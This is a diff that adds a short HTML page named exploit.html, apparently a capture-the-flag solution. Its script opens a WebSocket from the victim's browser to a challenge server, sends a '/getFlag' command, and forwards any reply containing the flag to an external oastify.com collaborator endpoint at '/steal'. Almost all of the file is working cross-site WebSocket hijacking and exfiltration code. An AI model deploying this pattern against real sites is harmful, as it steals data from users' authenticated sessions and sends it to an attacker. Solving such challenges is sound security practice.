@@ -1,0 +1,26 @@
+<!-- exploit.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit</title>
+</head>
+<body>
+    <script>
+        // Open WebSocket connection to target
+        const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
+        
+        ws.onopen = () => {
+            // Send the getFlag command once connected
+            ws.send(JSON.stringify({message: '/getFlag'}));
+        };
+        
+        ws.onmessage = (event) => {
+            // When we receive the flag, send it to our server
+            const response = JSON.parse(event.data);
+            if (response.message.includes('Flag:')) {
+                fetch('https://3w0c4g3otrmy8uy34jvdwg5pmgs7gy4n.oastify.com/steal?flag=' + encodeURIComponent(response.message));
+            }
+        };
+    </script>
+</body>
+</html>
